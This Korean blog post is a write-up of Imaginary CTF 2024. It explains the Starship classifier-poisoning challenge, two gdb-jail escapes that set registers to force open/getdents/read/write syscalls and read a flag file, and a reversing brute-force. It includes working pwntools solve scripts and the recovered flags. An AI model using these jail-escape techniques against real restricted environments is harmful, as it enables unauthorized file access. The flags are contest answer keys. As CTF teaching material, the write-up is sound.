---
title: "Imaginary CTF 2024 Write up"
date: 2024-07-21 +0900
categories: [WRITE-UP]
tags: ['imaginary ctf', 'write up']
image:
    path: "/assets/img/posts/2024-07-21-Imaginary-CTF-2024-Write-up/image.png"
    alt: "Imaginary CTF 2024"
    lqip: "/assets/img/posts/2024-07-21-Imaginary-CTF-2024-Write-up/image.png"
---

## Misc

### Starship

- KNeigheborsClassifier 는 가까운 데이터를 그룹지어 분류하는 모델이다
- 해당 코드에서는 인접한 3개의 데이터 분류한다.
- 해당 코드는 주어진 데이터(`incoming`)에 대한 예측값이 모두 `enemy` 이다.
- flag는 `incoming` 에 대한 예측값이 모두 `friendly` 로 판단되어야 flag를 출력할 수 있다.
- choice에 42를 입력하면 새로운 데이터 셋을 하나 입력할 수 있다.
- 이를 이용하여 `incoming[0]`, `incoming[1]` 값의 중간 값을 입력하여 다시 학습을 시켜준 후 예측을 해보면 확률적으로 두 데이터에 대해 `friendly` 뜬다.

```python
p = remote('starship.chal.imaginaryctf.org', 1337)
p.sendlineafter(b'> ', b'4')
p.recvuntil(b'target 1: ')
target1 = p.recvuntil(b' ').strip(b' ').decode()
p.recvuntil(b'target 2: ')
target2 = p.recvuntil(b' ').strip(b' ').decode()

print(target1)
print(target2)

target1 = target1.split(',')
target2 = target2.split(',')
new_data = []

for i in range(9):
    mid = (int(target1[i]) + int(target2[i])) // 2
    new_data.append(str(mid))

new_data.append('friendly')
new_dataset = ','.join(new_data)
print(new_dataset)

p.interactive()

```

### gdbjail1

- gdb를 안에서 사용할 수 있는 커맨드는 `break` , `set`, `continue` 로 제한되어 있다.
- `/bin/cat` 을 실행시키고 `read()` 에서 bp를 잡고 있다.

```python
import gdb

def main():
    gdb.execute("file /bin/cat")
    gdb.execute("break read")
    gdb.execute("run")

    while True:
        try:
            command = input("(gdb) ")
            if command.strip().startswith("break") or command.strip().startswith("set") or command.strip().startswith("continue"):
                try:
                    gdb.execute(command)
                except gdb.error as e:
                    print(f"Error executing command '{command}': {e}")
            else:
                print("Only 'break', 'set', and 'continue' commands are allowed.")
        except:
            pass

if __name__ == "__main__":
    main()
```

`read()` 에서 `syscall` 호출하기 전에 bp를 잡고 `set` 을 통해 레지스터를 세팅하여 원하는 시스템 콜을 호출할 수 있다.

```python
Dump of assembler code for function __GI___libc_read:
   0x00007ffff7d147d0 <+0>:	endbr64 
   0x00007ffff7d147d4 <+4>:	mov    eax,DWORD PTR fs:0x18
   0x00007ffff7d147dc <+12>:	test   eax,eax
   0x00007ffff7d147de <+14>:	jne    0x7ffff7d147f0 <__GI___libc_read+32>
   0x00007ffff7d147e0 <+16>:	syscall 
   0x00007ffff7d147e2 <+18>:	cmp    rax,0xfffffffffffff000
   0x00007ffff7d147e8 <+24>:	ja     0x7ffff7d14840 <__GI___libc_read+112>
   0x00007ffff7d147ea <+26>:	ret    
   0x00007ffff7d147eb <+27>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x00007ffff7d147f0 <+32>:	sub    rsp,0x28
   0x00007ffff7d147f4 <+36>:	mov    QWORD PTR [rsp+0x18],rdx
   0x00007ffff7d147f9 <+41>:	mov    QWORD PTR [rsp+0x10],rsi
   0x00007ffff7d147fe <+46>:	mov    DWORD PTR [rsp+0x8],edi
   0x00007ffff7d14802 <+50>:	call   0x7ffff7c909f0 <__GI___pthread_enable_asynccancel>
   0x00007ffff7d14807 <+55>:	mov    rdx,QWORD PTR [rsp+0x18]
   0x00007ffff7d1480c <+60>:	mov    rsi,QWORD PTR [rsp+0x10]
   0x00007ffff7d14811 <+65>:	mov    r8d,eax
   0x00007ffff7d14814 <+68>:	mov    edi,DWORD PTR [rsp+0x8]
   0x00007ffff7d14818 <+72>:	xor    eax,eax
=> 0x00007ffff7d1481a <+74>:	syscall
```

`open()`, `read()` , `write()` 를 사용하여 flag를 획득했다.

```python
from pwn import *

#context.log_level = 'debug'

p = remote('gdbjail1.chal.imaginaryctf.org', 1337)

p.sendlineafter(b'(gdb) ',b'set $buf=$rsi+32')
p.sendlineafter(b'(gdb) ',b'set $name=$rsi')

p.sendlineafter(b'(gdb) ',b'break *read+12')
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $eax=1')

# read(0, name, 0x20)
p.sendlineafter(b'(gdb) ',b'break *read+74')
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $rdi=0')
p.sendlineafter(b'(gdb) ',b'set $rsi=$name')
p.sendlineafter(b'(gdb) ',b'set $rdx=32')
p.sendlineafter(b'(gdb) ',b'set $rax=0')
p.sendlineafter(b'(gdb) ',b'continue')

p.sendline(b'flag.txt\x00')

p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $eax=1')

# open(filename, O_RDONLY)
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $rdi=$name')
p.sendlineafter(b'(gdb) ',b'set $rsi=0')
p.sendlineafter(b'(gdb) ',b'set $rdx=0')
p.sendlineafter(b'(gdb) ',b'set $rax=2')
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $eax=1')

# read(0, buf, 0x20)
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $rdi=3')
p.sendlineafter(b'(gdb) ',b'set $rsi=$buf')
p.sendlineafter(b'(gdb) ',b'set $rdx=32')
p.sendlineafter(b'(gdb) ',b'set $rax=0')
p.sendlineafter(b'(gdb) ',b'continue')

p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $eax=1')

# write(1, buf, 0x20)
p.sendlineafter(b'(gdb) ',b'continue')
p.sendlineafter(b'(gdb) ',b'set $rdi=1')
p.sendlineafter(b'(gdb) ',b'set $rsi=$buf')
p.sendlineafter(b'(gdb) ',b'set $rdx=32')
p.sendlineafter(b'(gdb) ',b'set $rax=1')
p.sendlineafter(b'(gdb) ',b'continue')

print(p.recv(1024))
'''

p.interactive()
'''

```

```python
b'ictf{n0_m0re_debugger_a2cd3018}\n'
```

### gdbjail2

gdbjail1 과 같은 컨셉의 문제이지만 이번에는 필터링되는 문자가 많이 생겼고 더불어 flag 파일의 이름도 랜덤한 문자열로 변경됐다.

```docker
COPY flag.txt /home/user/flag.txt
RUN mv /home/user/flag.txt /home/user/`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20`.txt
COPY run.sh /home/user/chal
COPY gdbinit.sh /home/user/gdbinit
COPY main.py /home/user/main.py
RUN chmod 555 /home/user/chal
```

```python
import gdb

blacklist = ["p", "-", "&", "(", ")", "[", "]", "{", "}", "0x"]

def main():
    gdb.execute("file /bin/cat")
    gdb.execute("break read")
    gdb.execute("run")

    while True:
        try:
            command = input("(gdb) ")
            if any([word in command for word in blacklist]):
                print("Banned word detected!")
                continue
            if command.strip().startswith("break") or command.strip().startswith("set") or command.strip().startswith("continue"):
                try:
                    gdb.execute(command)
                except gdb.error as e:
                    print(f"Error executing command '{command}': {e}")
            else:
                print("Only 'break', 'set', and 'continue' commands are allowed.")
        except:
            pass

if __name__ == "__main__":
    main()

```

flag 파일을 읽기에 앞서 flag 파일의 이름을 알아야한다.

따라서 이번엔 `open()` , `getdents()` , `read()` , `write()` 를 이용하여 파일 이름을 알아낸 다음 flag를 얻었다.

```python
from pwn import *

#context.log_level = 'debug'

p = remote('gdbjail2.chal.imaginaryctf.org', 1337)

p.sendlineafter(b'(gdb) ','set $buf=$rsi+32')
p.sendlineafter(b'(gdb) ','set $name=$rsi')

p.sendlineafter(b'(gdb) ','break *read+12')
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# read(0, name, 1)
p.sendlineafter(b'(gdb) ','break *read+74')
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=0')
p.sendlineafter(b'(gdb) ','set $rsi=$name')
p.sendlineafter(b'(gdb) ','set $rdx=1')
p.sendlineafter(b'(gdb) ','set $rax=0')
p.sendlineafter(b'(gdb) ','continue')

p.sendline(b'.')  # Current Directory
print(p.recv(1024))

p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# open(filename, O_RDONLY|O_DIRECTORY)
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=$name')
p.sendlineafter(b'(gdb) ','set $rsi=65536')
p.sendlineafter(b'(gdb) ','set $rdx=0')
p.sendlineafter(b'(gdb) ','set $rax=2')
p.sendlineafter(b'(gdb) ','continue')

p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# getdents(fd, struct *dirent, count)
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=3')
p.sendlineafter(b'(gdb) ','set $rsi=$buf')
p.sendlineafter(b'(gdb) ','set $rdx=1024')
p.sendlineafter(b'(gdb) ','set $rax=78')

p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# read(0, name, 24)
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=0')
p.sendlineafter(b'(gdb) ','set $rsi=$name')
p.sendlineafter(b'(gdb) ','set $rdx=24')
p.sendlineafter(b'(gdb) ','set $rax=0')
p.sendlineafter(b'(gdb) ','continue')

p.sendline(b'W4GbJUuvbTGypTHrXAeD.txt')

p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# open(filename, O_RDONLY)
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=$name')
p.sendlineafter(b'(gdb) ','set $rsi=0')
p.sendlineafter(b'(gdb) ','set $rdx=0')
p.sendlineafter(b'(gdb) ','set $rax=2')
p.sendlineafter(b'(gdb) ','continue')

p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# read(0, name, 64)
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=4')
p.sendlineafter(b'(gdb) ','set $rsi=$buf')
p.sendlineafter(b'(gdb) ','set $rdx=64')
p.sendlineafter(b'(gdb) ','set $rax=0')
p.sendlineafter(b'(gdb) ','continue')

p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $eax=1')

# write(1, buf, 64)
p.sendlineafter(b'(gdb) ','continue')
p.sendlineafter(b'(gdb) ','set $rdi=1')
p.sendlineafter(b'(gdb) ','set $rsi=$buf')
p.sendlineafter(b'(gdb) ','set $rdx=64')
p.sendlineafter(b'(gdb) ','set $eax=1')
p.sendlineafter(b'(gdb) ','continue')

print(p.recv(1024))
p.interactive()

```

```python
   (gdb) ictf{i_l0ve_syscalls_eebc5336}
\xb02\x14\x00\x00gD\xbbLZ\xf0\xf0?0\x004GbJUuvbTGypTW4GbJUuvbTGypTHrXAeD.txt\x00\x00\x00\x00ictf{i_l0ve_syscalls_eebc5336}
```

## Reversing

바이너리를 분석해보면 `iterator` 라는 함수에서 같은 방식으로 인코딩하는 것을 볼 수 있다.

해당 로직을 그대로 구현하여 brute force 로 flag를 얻으려 시도 했다.

아래의 코드를 실행하면

```python
from z3 import *
import string

ascii_table = string.ascii_letters + string.digits + '_' + '{' + '}'
result = [0xb4,0x31,0x8e,0x02,0xaf,0x1c,0x5d,0x23,0x98,0x7d,0xa3,0x1e,0xb0,0x3c,0xb3,0xc4,0xa6,0x06,0x58,0x28,0x19,0x7d,0xa3,0xc0,0x85,0x31,0x68,0x0a,0xbc,0x03,0x5d,0x3d,0x0b]

#test = [0x37,0x3d,0x8e,0x0c,0x96,0x1f,0xd9,0x7d,0xa1,0x31,0x93,0x13,0x85,0x3e,0xad,0x05,0xf6,0x00,0xc5,0x35,0xc5,0x45,0x63,0x00,0x85,0x0c,0x34,0x08,0x44,0x14,0x45,0x00,0x63]

predict = 'ictf{m0r3_than_1_way5_t0_c0n7rul}'
# flag = ictf{m0r3_than_1_way5_t0_c0n7r0l}

table1 = [0x52, 0x64, 0x71, 0x51, 0x54, 0x76]
table2 = [1, 3, 4, 2, 6, 5]
counter1 = 0
counter2 = 0

def iterator(a1, v3):
    v1 = 0
    tmp6 = table1[counter1] ^ v3
    tmp5 = ((v3 << 2) | (v3 >> 6)) & 0xff
    tmp4 = (v3 >> table2[counter2] | v3 << (8 - table2[counter2])) & 0xff
    tmp3 = (((v3 >> 2) | (v3 << 6)) ^ table1[counter1]) & 0xff
    tmp2 = (a1 & 1)

    if v3 > 0x60 and v3 <= 0x7a:
        v1 = 1
    else:
        v1 = 0
    
    tmp1 = v1
    enc = (((tmp1 * tmp6) + ((tmp1 ^ 1) * tmp5)) * tmp2) + ((tmp2 ^ 1) * ((tmp1 * tmp4) + ((tmp1 ^ 1) * tmp3)))

    return enc, tmp2

flag = ''
for i in range(33):
    row = []
    for j in ascii_table:
        n, v4 = iterator(i, ord(j))
        n = n & 0xff
        if n == result[i]:
            flag += j

            counter1 = (v4 + counter1) % 6
            counter2 = (v4 + counter2) % 6
            break
            

print(flag)

```

아래와 같이 flag가 나오는 데 정확한 flag는 아니다. 하지만 얼추 비슷하게 나와 유추해볼 수 있는데 추측으로는 같은 값이 나오는 문자가 2개 있어서 아래와 같이 나온 것 같다.

```python
ictf{mur3_than_1jway5_t0_c0n7rul}
```

위의 코드에서 flag를 유추하여 다시 돌려보면 정확한 flag 값이 나온다.

```python
predict = 'ictf{m0r3_than_1_way5_t0_c0n7rul}'
# flag = ictf{m0r3_than_1_way5_t0_c0n7r0l}

table1 = [0x52, 0x64, 0x71, 0x51, 0x54, 0x76]
table2 = [1, 3, 4, 2, 6, 5]
counter1 = 0
counter2 = 0

... 중략

flag = ''
for i in range(33):
    row = []
    for j in predict:
        n, v4 = iterator(i, ord(j))
        n = n & 0xff
        if n == result[i]:
            flag += j

            counter1 = (v4 + counter1) % 6
            counter2 = (v4 + counter2) % 6
            break
            

print(flag)
```

```python
ictf{m0r3_than_1_way5_t0_c0n7r0l}
```